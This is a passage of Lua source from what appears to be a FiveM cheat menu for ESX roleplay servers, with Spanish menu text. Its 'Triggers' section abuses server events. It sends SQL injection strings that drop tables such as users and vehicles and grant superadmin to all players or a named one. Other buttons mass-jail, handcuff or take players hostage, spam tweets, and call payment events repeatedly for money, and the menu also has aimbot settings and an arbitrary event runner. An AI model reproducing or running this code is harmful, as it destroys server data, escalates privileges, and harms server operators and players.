                        if not g or g == "" or not tonumber(g) then

                            PCCT:AddNotification("ERROR", "Invalid green value.", 5000)

                        else

                            local b = PCCT:GetTextInput("Enter blue value.", b, 3)



                            if not b or b == "" or not tonumber(b) then

                                PCCT:AddNotification("ERROR", "Invalid blue value.", 5000)

                            else

                                r = PCCT:Clamp(tonumber(r), 0, 255)

                                g = PCCT:Clamp(tonumber(g), 0, 255)

                                b = PCCT:Clamp(tonumber(b), 0, 255)

                                PCCT:GetFunction("SetVehicleNeonLightsColour")(veh, r, g, b)

                            end

                        end

                    end

                end

            },

            {

                Name = "Neon Lights",

                Get = function(veh) return "" end,

                Set = function(veh)

                    for i = 0, 4 do

                        SetVehicleNeonLightEnabled(veh, i, true)

                    end

                end

            },

            {

                Name = "Xenon Lights",

                Get = function(veh) return "" end,

                Set = function(veh)

                    ToggleVehicleMod(veh, 22, true)

                end

            }

        }

    }



    local LSC_List = {"Paint", "Lights"}

    local current_lsc_menu

    local current_lsc_opt = 1

    local old_lsc_opt



    function PCCT:DoLSC(bOn)

        if bOn ~= nil then

            self.UseLSC = bOn

            current_lsc_menu = nil

            current_lsc_opt = 1

        end



        if not self.UseLSC then return end

        local curVeh = self:GetFunction("GetVehiclePedIsIn")(self.LocalPlayer)



        if not self:GetFunction("DoesEntityExist")(curVeh) or self:GetFunction("GetPedInVehicleSeat")(curVeh, -1) ~= self.LocalPlayer then

            self.UseLSC = false



            return self:AddNotification("ERROR", "Nesecitas estar en un vehiculo!", 5000)

        end



        if bOn ~= nil then

            self.Showing = not bOn

        end



        self.Painter:DrawText("[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "] Los Santos Customs", 4, false, 101, 101, 0.35, 255, 255, 255, 255)

        local sY = 30



        if not current_lsc_menu then

            for id, name in picho.pairs(LSC_List) do

                local r, g, b = 255, 255, 255



                if current_lsc_opt == id then

                    r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]

                end



                self.Painter:DrawText(name, 4, false, 101, 101 + sY, 0.35, r, g, b, 255)

                sY = sY + 20

            end

        else

            for id, dat in picho.pairs(LSC_Menu[current_lsc_menu]) do

                local r, g, b = 255, 255, 255



                if current_lsc_opt == id then

                    r, g, b = self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3]

                end



                self.Painter:DrawText(dat.Name .. " " .. dat.Get(curVeh), 4, false, 101, 101 + sY, 0.35, r, g, b, 255)

                sY = sY + 20

            end

        end



        if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["DOWN"]) and not self.Showing then

            current_lsc_opt = current_lsc_opt + 1



            if current_lsc_menu then

                if current_lsc_opt < 1 then

                    current_lsc_opt = #LSC_Menu[current_lsc_menu]

                elseif not LSC_Menu[current_lsc_menu][current_lsc_opt] then

                    current_lsc_opt = 1

                end

            else

                if current_lsc_opt < 1 then

                    current_lsc_opt = #LSC_List

                elseif not LSC_List[current_lsc_opt] then

                    current_lsc_opt = 1

                end

            end

        end



        if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["UP"]) and not self.Showing then

            current_lsc_opt = current_lsc_opt - 1



            if current_lsc_menu then

                if current_lsc_opt < 1 then

                    current_lsc_opt = #LSC_Menu[current_lsc_menu]

                elseif not LSC_Menu[current_lsc_menu][current_lsc_opt] then

                    current_lsc_opt = 1

                end

            else

                if current_lsc_opt < 1 then

                    current_lsc_opt = #LSC_List

                elseif not LSC_List[current_lsc_opt] then

                    current_lsc_opt = 1

                end

            end

        end



        if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["BACKSPACE"]) and not self.Showing then

            if not current_lsc_menu then

                self.UseLSC = false

                current_lsc_opt = 1

                old_lsc_opt = 1

            else

                current_lsc_menu = nil

                current_lsc_opt = old_lsc_opt

                old_lsc_opt = nil

            end

        end



        if self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["ENTER"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["MOUSE1"]) and not self:GetFunction("IsDisabledControlJustPressed")(0, self.Keys["SPACE"]) and not self.Showing then

            if not current_lsc_menu then

                current_lsc_menu = LSC_List[current_lsc_opt]

                old_lsc_opt = current_lsc_opt

                current_lsc_opt = 1

            else

                local opt = LSC_Menu[current_lsc_menu][current_lsc_opt]



                if opt then

                    opt.Set(curVeh)

                end

            end

        end



        self.Painter:DrawRect(101, 100, 360, sY + 8, 0, 0, 0, 200)

        self.Painter:DrawRect(101, 130, 360, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], 255)

    end



    PCCT:AddCategory("Triggers(~b~TEST~w~)", function(self, x, y, w, h)

        local curY = 5

        if _count(self.DynamicTriggers) <= 0 then return self.Painter:DrawText("No triggers could be found.", 4, false, x + 5, y + 5, 0.4, 255, 255, 255, 255) end



        if self.DynamicTriggers["esx-qalle-jail"] and self.DynamicTriggers["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"] then

            if self.Painter:Button("CARCEL ~g~ESX ~s~(ALT TODOS) (SHIFT RASON)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "jail") then

                CreateThread(function()

                    local reason = "^3#SourceKill"



                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then

                        local _msg = self:GetTextInput("Rason de carcel.", reason, 200)



                        if _msg then

                            reason = _msg

                        end

                    end



                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then

                        for id, src in picho.pairs(self.PlayerCache) do

                            src = picho.tonumber(src)

                            local _id = picho.tonumber(self:GetFunction("GetPlayerServerId")(src))

                            self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"], _id, picho.math.random(500, 5000), reason)

                        end



                        self:AddNotification("INFO", "Todos pa carcel!", 10000)

                    else

                        local who = self:GetTextInput("Enter player id.", "", 5)



                        if who then

                            _id = picho.tonumber(who)



                            if not _id then

                                self:AddNotification("ERROR", "ID invalida.", 5000)

                            else

                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx-qalle-jail"]["esx-qalle-jail:jailPlayer"], _id, picho.math.random(500, 5000), reason)

                                self:AddNotification("INFO", "Carcel " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, _id) .. "!", 10000)

                            end

                        end

                    end

                end)

            end



            curY = curY + 25

        end



        if self.DynamicTriggers["esx_policejob"] and self.DynamicTriggers["esx_policejob"]["esx_policejob:handcuff"] then

            if self.Painter:Button("ESPOSAR ~g~ESX ~s~(ALT PARA TODOS)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "handcuff_all") then

                CreateThread(function()

                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then

                        for id, src in picho.pairs(self.PlayerCache) do

                            src = picho.tonumber(src)

                            local _id = picho.tonumber(self:GetFunction("GetPlayerServerId")(src))

                            self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_policejob"]["esx_policejob:handcuff"], _id)

                        end



                        self:AddNotification("INFO", "Esposados pa!", 10000)

                    else

                        local who = self:GetTextInput("Pon el id.", "", 5)



                        if who then

                            local _id = picho.tonumber(who)



                            if not _id then

                                self:AddNotification("ERROR", "ID invalida.", 5000)

                            else

                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_policejob"]["esx_policejob:handcuff"], _id)

                                self:AddNotification("INFO", "Cuffed " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, _id) .. "!", 10000)

                            end

                        end

                    end

                end)

            end



            curY = curY + 25

        end



        if self.DynamicTriggers["CarryPeople"] and self.DynamicTriggers["CarryPeople"]["CarryPeople:sync"] then

            if self.Painter:Button("CARGAR TODOS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "carry_all") then

                if self.Config.SafeMode then

                    return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

                else

                    CreateThread(function()

                        for id, src in picho.pairs(self.PlayerCache) do

                            src = picho.tonumber(src)



                            if src ~= self.NetworkID then

                                local ped = self:GetFunction("GetPlayerPed")(src)



                                if self:GetFunction("DoesEntityExist")(ped) then

                                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["CarryPeople"]["CarryPeople:sync"], ped, "missfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63, self:GetFunction("GetPlayerServerId")(src), 100000, 0.0, 49, 33, 1)

                                    Wait(100)

                                end

                            end

                        end

                    end)



                    self:AddNotification("INFO", "Cargando a todos!", 10000)

                end

            end



            curY = curY + 25

        end



        if self.DynamicTriggers["TakeHostage"] and self.DynamicTriggers["TakeHostage"]["cmg3_animations:sync"] then

            if self.Painter:Button("REHEN TODOS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "th_all") then

                if self.Config.SafeMode then

                    return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

                else

                    CreateThread(function()

                        for id, src in picho.pairs(self.PlayerCache) do

                            src = picho.tonumber(src)



                            if src ~= self.NetworkID then

                                local ped = self:GetFunction("GetPlayerPed")(src)



                                if self:GetFunction("DoesEntityExist")(ped) then

                                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["TakeHostage"]["cmg3_animations:sync"], ped, "anim@gangops@hostage@", "anim@gangops@hostage@", "perp_idle", "victim_idle", 0.11, 0.24, 0.0, self:GetFunction("GetPlayerServerId")(src), 100000, 0.0, 49, 49, 50, true)

                                    Wait(100)

                                end

                            end

                        end

                    end)



                    self:AddNotification("INFO", "Rehenes pa!", 10000)

                end

            end



            curY = curY + 25

        end



        if self.DynamicTriggers["PiggyBack"] and self.DynamicTriggers["PiggyBack"]["cmg2_animations:sync"] then

            if self.Painter:Button("MONTAR A TODOS", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "pb_all") then

                if self.Config.SafeMode then

                    return self:AddNotification("AVISO", "Modo seguro activado, desactivalo para poder usarlo")

                else

                    CreateThread(function()

                        for id, src in picho.pairs(self.PlayerCache) do

                            src = picho.tonumber(src)



                            if src ~= self.NetworkID then

                                local ped = self:GetFunction("GetPlayerPed")(src)



                                if self:GetFunction("DoesEntityExist")(ped) then

                                    self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["PiggyBack"]["cmg2_animations:sync"], ped, "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_a", "piggyback_c_player_b", -0.07, 0.0, 0.0, self:GetFunction("GetPlayerServerId")(src), 100000, 0.0, 49, 33, 1, 1)

                                    Wait(100)

                                end

                            end

                        end

                    end)



                    self:AddNotification("INFO", "Uy estan en tu espalda!", 10000)

                end

            end



            curY = curY + 25

        end



        if self.DynamicTriggers["esx_policejob"] and self.DynamicTriggers["esx_policejob"]["esx_communityservice:sendToCommunityService"] then

            if self.Painter:Button("COMMUNITY SERVICE ALL ~g~ESX ~s~(ALT FOR ALL) (SHIFT FOR TIME)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "service_all") then

                CreateThread(function()

                    local time = math.random(500, 5000)



                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then

                        local _msg = self:GetTextInput("Enter service time.", time, 10)



                        if _msg then

                            time = picho.tonumber(_msg) or time

                        end

                    end



                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then

                        for id, src in picho.pairs(self.PlayerCache) do

                            src = picho.tonumber(src)

                            local _id = picho.tonumber(self:GetFunction("GetPlayerServerId")(src))

                            self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_policejob"]["esx_communityservice:sendToCommunityService"], _id, time)

                        end



                        self:AddNotification("INFO", "Todos los jugadores enviados a servicios comunitarios!", 10000)

                    else

                        local who = self:GetTextInput("Id del jugador.", "", 5)



                        if who then

                            local _id = picho.tonumber(who)



                            if not _id then

                                self:AddNotification("ERROR", "Id invalida.", 5000)

                            else

                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_policejob"]["esx_communityservice:sendToCommunityService"], _id, time)

                                self:AddNotification("INFO", "Se le dio los servicios comunitarios a" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, _id) .. "!", 10000)

                            end

                        end

                    end

                end)

            end



            curY = curY + 25

        end



        if self.DynamicTriggers["esx_inventoryhud"] and self.DynamicTriggers["esx_inventoryhud"]["esx_inventoryhud:openPlayerInventory"] then

            if self.Painter:Button("Abrir inventario ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "open_inventory") then

                local who = self:GetFunction("GetPlayerPed")(self.SelectedPlayer)



                if not self:GetFunction("DoesEntityExist")(who) then

                    self:AddNotification("ERROR", "Nesecitas seleccionar a un jugador!", 10000)

                else

                    TriggerEvent(self.DynamicTriggers["esx_inventoryhud"]["esx_inventoryhud:openPlayerInventory"], self:GetFunction("GetPlayerServerId")(self.SelectedPlayer), self:GetFunction("GetPlayerName")(self.SelectedPlayer))

                    self.Showing = false

                end

            end



            curY = curY + 25

        end



        if (self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]) then

            if self.Painter:Button("BORRAR BASE ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "delete_database") then

                local possible_tables = {"twitter_accounts", "twitter_likes", "twitter_tweets", "phone_app_chat", "users", "user_accounts", "user_inventory", "society_moneywash", "phone_users_contacts", "characters", "billing", "vehicles", "weashops", "vehicle_categories", "rented_vehicles", "addon_account_data", "addon_inventory_items", "datastore_data", "owned_vehicles", "phone_calls", "phone_messages", "rented_vehicles", "user_licenses", "mysql"}



                CreateThread(function()

                    for _, str in picho.ipairs(possible_tables) do

                        local injection = [['; DROP TABLE `]] .. str .. [[` #]]

                        self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)

                        self:AddNotification("EXITO", "Base borrada " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, str) .. "!", 5000)

                        Wait(100)

                    end



                    self:AddNotification("EXITO", "Base borrada!", 5000)

                end)

            end



            curY = curY + 25

        end



        if self.DynamicTriggers["esx_dmvschool"] and self.DynamicTriggers["esx_dmvschool"]["esx_dmvschool:addLicense"] then

            if self.Painter:Button("Todas las licencias (~b~T~r~R~w~) ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "dmv_all_licenses") then

                local possible_licenses = {"dmv", "drive", "drive_truck", "drive_bike"}



                CreateThread(function()

                    for _, str in picho.ipairs(possible_licenses) do

                        self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["esx_dmvschool"]["esx_dmvschool:addLicense"], str)

                        self:AddNotification("EXITO", "Darse licencias " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, str) .. "!", 5000)

                        Wait(100)

                    end



                    self:AddNotification("EXITO", "Todas las licencias dadas!", 5000)

                end)

            end



            curY = curY + 25

        end



        if self.DynamicTriggers["gcphone"] and self.DynamicTriggers["gcphone"]["gcPhone:twitter_postTweets"] then

            if self.Painter:Button("SPAM TWEET (~b~T~w~) ~g~ESX", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "spam_tweet") then

                local user, pass = "", ""

                local _msg = self:GetTextInput("Nombre de usuario.", time, 50)



                if _msg then

                    user = _msg

                end



                _msg = self:GetTextInput("Coontraseña.", time, 50)



                if _msg then

                    pass = _msg

                end



                if user == "" or pass == "" then

                    self:AddNotification("INFO", "Cancelado.", 5000)

                else

                    _msg = self:GetTextInput("Mensaje a spamear.", "", 5000)



                    if not _msg or _msg == "" then

                        self:AddNotification("INFO", "Cancelado.", 5000)

                    else

                        local times = self:GetTextInput("Cuantas veces lo mando?.", "1", 5000)



                        if not times or not picho.tonumber(times) then

                            times = 1

                        else

                            times = picho.tonumber(times)

                        end



                        if times <= 0 then

                            times = 1

                        end



                        self:AddNotification("INFO", "Enviando tweets " .. times .. " time" .. (times ~= 1 and "s" or ""), 10000)



                        CreateThread(function()

                            for i = 1, times do

                                if not self.Enabled then return end

                                self:GetFunction("TriggerServerEvent")(self.DynamicTriggers["gcphone"]["gcPhone:twitter_postTweets"], user, pass, _msg)

                                Wait(100)

                            end

                        end)

                    end

                end

            end



            curY = curY + 25

        end



        if (self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]) then

            if self.Painter:Button("SET SUPERADMIN ~g~ESX ~s~(ALT FOR ALL) (SHIFT FOR SPECIFIC)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "set_superadmin") then

                if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTALT"]) then

                    CreateThread(function()

                        local injection = [['; UPDATE `users` SET `group` = "superadmin", `permission_level` = 10 #]]

                        self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)

                        Wait(100)

                        self:AddNotification("EXITO", "Los jugadores son admins! Reunete.", 5000)

                    end)

                else

                    local name = ""



                    if self:GetFunction("IsDisabledControlPressed")(0, self.Keys["LEFTSHIFT"]) then

                        name = self:GetTextInput("Enter target's steam name.", "", 50)

                    else

                        name = self:GetFunction("GetPlayerName")(self.NetworkID)

                    end



                    if not name or name == "" then

                        self:AddNotification("INFO", "Cancelled.", 5000)

                    else

                        CreateThread(function()

                            name = name:gsub("\"", "\\\"")

                            local injection = [['; UPDATE `users` SET `group` = "superadmin", `permission_level` = 10 WHERE `name` = "]] .. name .. [[" #]]

                            self:GetFunction("TriggerServerEvent")((self.DynamicTriggers["esx_kashacter"] and self.DynamicTriggers["esx_kashacter"]["kashactersS:DeleteCharacter"]) or (self.DynamicTriggers["esx_kashacters"] and self.DynamicTriggers["esx_kashacters"]["kashactersS:DeleteCharacter"]), injection)

                            Wait(100)

                            self:AddNotification("EXITO", "Player " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, name) .. " should now have superadmin! You may have to rejoin.", 5000)

                        end)

                    end

                end

            end



            curY = curY + 25

        end



        if resource_list["esx_garbage"] then

            if self.Painter:Button("GARBAGE ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_garbage") then

                for i = 1, 2 do

                    self:GetFunction("TriggerServerEvent")("esx_garbage:pay", 1000)

                    Wait(100)

                end

            end



            curY = curY + 25

        end




        if resource_list["esx_prisonwork"] then

            if self.Painter:Button("PRISON WORK ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_garbage") then

                for i = 1, 100 do

                    self:GetFunction("TriggerServerEvent")("esx_loffe_fangelse:Pay")

                    Wait(100)

                end

            end



            curY = curY + 25

        end



        if resource_list["esx_jobsnowl"] then

            if self.Painter:Button("TRUCKER JOB ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_jobsnowl") then

                for i = 1, 2 do

                    self:GetFunction("TriggerServerEvent")("guille_trucker:pay", 500)

                    Wait(100)

                end

                self:AddNotification("INFO", "Ahora tienes dinero!")

            end



            curY = curY + 25

        end



        if resource_list["esx_truckerjob"] then

            if self.Painter:Button("TRUCKER JOB ~g~ESX ($$$)", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_truckerjob") then

                for i = 1, 4 do

                    self:GetFunction("TriggerServerEvent")("esx_truckerjob:pay", 500)

                    Wait(100)

                end

                self:AddNotification("INFO", "Ahora tienes dinero!")

            end



            curY = curY + 25

        end

    end)



    PCCT:AddCategory("Freecam", function(self, x, y)

        local curY = 5



        if self.Painter:CheckBox("CAMARA LIBRE", self.FreeCam.On, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "freecam") then

            self.FreeCam.On = not self.FreeCam.On

        end



        curY = curY + 20



        if self.Painter:ListChoice("MODO CAMARA LIBRE: ", self.FreeCam.ModeNames, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "freecam_mode") then

            self.FreeCam.Mode = list_choices["freecam_mode"].selected

            self.FreeCam.DraggingEntity = nil

            lift_height = 0.0

            lift_inc = 0.1

        end

    end)



    local keys = {"TAB", "MOUSE3", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "F1", "F2", "F3", "F5", "F6", "F7", "F8", "F9", "F10"}

    local disable_keys = {"-", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F5", "F6", "F7", "F8", "F9", "F10"}

    local freecam_keys = {"HOME", "MOUSE3", "TAB", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F5", "F6", "F7", "F8", "F9", "F10"}

    local rccar_keys = {"=", "MOUSE3", "TAB", "HOME", "DELETE", "PAGEUP", "PAGEDOWN", "INSERT", "F1", "F2", "F3", "F5", "F6", "F7", "F8", "F9", "F10"}

    local aimbot_keys = {"MOUSE1", "MOUSE2", "MOUSE3", "LEFTALT", "LEFTSHIFT", "MOUSE2", "SPACE", "CAPS", "C", "X", "Z", "V", "F", "G", "H", "E", "R", "Q", "T", "Y", "U", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10"}



    local function _run_lua(resource, trigger)

        local args = PCCT:GetTextInput("Enter Arguments.", "", 100)

        local _args



        if not args or args == "" then

            _args = {}

        else

            local e, r = load("return {" .. args .. "}")



            if e then

                _args = e()

            else

                PCCT:AddNotification("ERROR", "Execution failed. See console for details.")

                PCCT:Print("[LUA] Execution Failed (Arguments): ^1" .. r .. "^7")

            end

        end



        if picho.type(_args) == "table" then

            local amount = PCCT:GetTextInput("Enter repetitions.", 1, 10)



            if not amount or not picho.tonumber(amount) then

                amount = 1

            end



            amount = picho.tonumber(amount)

            local _type = PCCT:GetTextInput("Enter method. [CL/SV]", "SV", 2)



            if _type == "CL" then

                for i = 1, amount do

                    PCCT:GetFunction("TriggerEvent")(((not resource) and trigger or (PCCT.DynamicTriggers[resource][trigger])), picho.table.unpack(_args))

                end



                PCCT:AddNotification("INFO", "[CL] Running " .. ((not resource) and trigger or (PCCT.DynamicTriggers[resource][trigger])) .. " " .. amount .. " time(s)")

            elseif _type == "SV" then

                for i = 1, amount do

                    PCCT:GetFunction("TriggerServerEvent")(((not resource) and trigger or (PCCT.DynamicTriggers[resource][trigger])), picho.table.unpack(_args))

                end



                PCCT:AddNotification("INFO", "[SV] Running " .. ((not resource) and trigger or (PCCT.DynamicTriggers[resource][trigger])) .. " " .. amount .. " time(s)")

            else

                PCCT:AddNotification("ERROR", "Bad type.")

            end

        end

    end



    local selected_config = "none"



    function PCCT:IndexOf(table, val)

        for k, v in picho.pairs(table) do

            if v == val or k == val then return (v == val and k) or v end

        end



        return -1

    end



    PCCT:AddCategory("Opciones", function(self, x, y)

        local curY = 5



        if self.Painter:CheckBox("MOSTRAR TEXTO", self.Config.ShowText, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "text_settings_enabled", false) then

            self.Config.ShowText = not self.Config.ShowText

        end



        curY = curY + 25



        if self.Painter:CheckBox("MOSTRAR NOTIFICACIONES", self.Config.ShowNotifications, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "show_notifications", false) then

            self.Config.ShowNotifications = not self.Config.ShowNotifications

        end



        curY = curY + 25



        if self.Painter:CheckBox("SONIDOS MENU", self.Config.UseSounds, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "menu_sounds", false) then

            self.Config.UseSounds = not self.Config.UseSounds

        end



        curY = curY + 25



        if self.Painter:CheckBox("MOVER SOLO", self.Config.UseAutoWalk, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "auto_walk_enabled", false) then

            self.Config.UseAutoWalk = not self.Config.UseAutoWalk

        end



        curY = curY + 25



        if self.Painter:CheckBox("MOVER CUANDO FREECAM / CARRO RC", self.Config.UseAutoWalkAlt, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "auto_walk_alt_enabled", false) then

            self.Config.UseAutoWalkAlt = not self.Config.UseAutoWalkAlt

        end



        curY = curY + 25



        if self.Painter:CheckBox("MODO SEGURO", self.Config.SafeMode, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "safe_mode", false) then

            self.Config.SafeMode = not self.Config.SafeMode

        end



        curY = curY + 25



        if self.Painter:CheckBox("No Ver Fondo", self.Config.UseBackgroundImage, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "use_bg_image", false) then

            self.Config.UseBackgroundImage = not self.Config.UseBackgroundImage

        end


        
        curY = curY + 25



        if self.Painter:CheckBox("VER MENSAJES", self.Config.UsePrintMessages, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "use_print_messages", false) then

            self.Config.UsePrintMessages = not self.Config.UsePrintMessages

        end



        curY = curY + 25



        if self.Painter:CheckBox("NO MOVERTE", self.Config.DisableMovement, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "disable_movement", false) then

            self.Config.DisableMovement = not self.Config.DisableMovement

        end



        curY = curY + 20



        if self.Painter:ListChoice("TECLA ", keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "toggle_key", self:IndexOf(keys, self.Config.ShowKey)) then

            self.Config.ShowKey = keys[list_choices["toggle_key"].selected]

        end



        curY = curY + 25



        if self.Painter:ListChoice("TECLA FREECAM: ", freecam_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "freecam_key", self:IndexOf(freecam_keys, self.Config.FreeCamKey), "FreeCamKey") then

            self.Config.FreeCamKey = freecam_keys[list_choices["freecam_key"].selected]

        end



        curY = curY + 25



        if self.Painter:ListChoice("TECLA RC: ", rccar_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "rccar_key", self:IndexOf(rccar_keys, self.Config.RCCamKey), "RCCamKey") then

            self.Config.RCCamKey = rccar_keys[list_choices["rccar_key"].selected]

        end



        curY = curY + 25



        if self.Painter:ListChoice("TECLA AIMBOT: ", aimbot_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_key", self:IndexOf(aimbot_keys, self.Config.Player.AimbotKey)) then

            self.Config.Player.AimbotKey = aimbot_keys[list_choices["aimbot_key"].selected]

        end



        curY = curY + 25



        if self.Painter:ListChoice("QUITAR AIMBOT: ", aimbot_keys, x, y, 5, curY, nil, 20, 255, 255, 255, 255, "aimbot_release_key", self:IndexOf(aimbot_keys, self.Config.Player.AimbotReleaseKey), "AimbotReleaseKey") then

            self.Config.Player.AimbotReleaseKey = aimbot_keys[list_choices["aimbot_release_key"].selected]

        end



        curY = curY + 25



        if self.Painter:Button("Color del Menu: " .. self.Config.Tertiary[1] .. " " .. self.Config.Tertiary[2] .. " " .. self.Config.Tertiary[3], x, y, 5, curY, nil, 20, 255, 255, 255, 255, "menu_color") then

            local r = self:GetTextInput("Enter red value.", self.Config.Tertiary[1], 3)



            if not r or r == "" or not tonumber(r) then

                self:AddNotification("ERROR", "Invalid red value.", 5000)

            else

                local g = self:GetTextInput("Enter green value.", self.Config.Tertiary[2], 3)



                if not g or g == "" or not tonumber(g) then

                    self:AddNotification("ERROR", "Invalid green value.", 5000)

                else

                    local b = self:GetTextInput("Enter blue value.", self.Config.Tertiary[3], 3)



                    if not b or b == "" or not tonumber(b) then

                        self:AddNotification("ERROR", "Invalid blue value.", 5000)

                    else

                        r = self:Clamp(tonumber(r), 0, 255)

                        g = self:Clamp(tonumber(g), 0, 255)

                        b = self:Clamp(tonumber(b), 0, 255)

                        self.Config.Tertiary = {r, g, b, 255}

                        self.TertiaryHex = self:RGBToHex({r, g, b})



                        branding = {

                            name = "[" .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self.Name) .. "~s~]",

                            resource = "Recurso: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self:GetFunction("GetCurrentResourceName")()),

                            ip = "IP: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self:GetFunction("GetCurrentServerEndpoint")()),

                            id = "ID Del Sv: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, self:GetFunction("GetPlayerServerId")(self.NetworkID)),

                            veh = "Vehiculo: " .. ("<font color='#%s'>%s</font>"):format(self.TertiaryHex, "%s"),

                            build = (_Executor_Strings[_Executor] or "") .. " ~s~Build (" .. self.Build .. ")"

                        }



                    end

                end

            end

        end



        curY = curY + 25



        if picho.payload then

            if self.Painter:Button("EXECUTE ~g~ESX ~s~OBJECT PAYLOAD", x, y, 5, curY, nil, 20, 255, 255, 255, 255, "esx_object_payload") then

                picho.payload()

                picho.payload = nil

            end

        end

    end)



    PCCT:AddCategory("~r~CERRAR", function(self, x, y)

        self.Showing = false

        self.FreeCam.On = false

        self.RCCar.On = false

        self.SpectatingPlayer = nil



        self.Config = {

            Binds = {},

            Player = {},

            Vehicle = {}

        }



        self:GetFunction("DestroyCam")(self.FreeCam.Cam)

        self:GetFunction("DestroyCam")(self.RCCar.Cam)

        self:GetFunction("DestroyCam")(self.SpectateCam)

        self:GetFunction("ClearPedTasks")(self.LocalPlayer)

        self:DoBlips(true)

        Wait(1)

        self.Enabled = false

    end)



    local scroller_pos

    local scroller_size

    local old_scroller

    local cur_count

    local scroller_max



    function PCCT:GetScrollBasis(count)

        if count <= 30 then

            return 1.0

        elseif count <= 40 then

            return 1.1

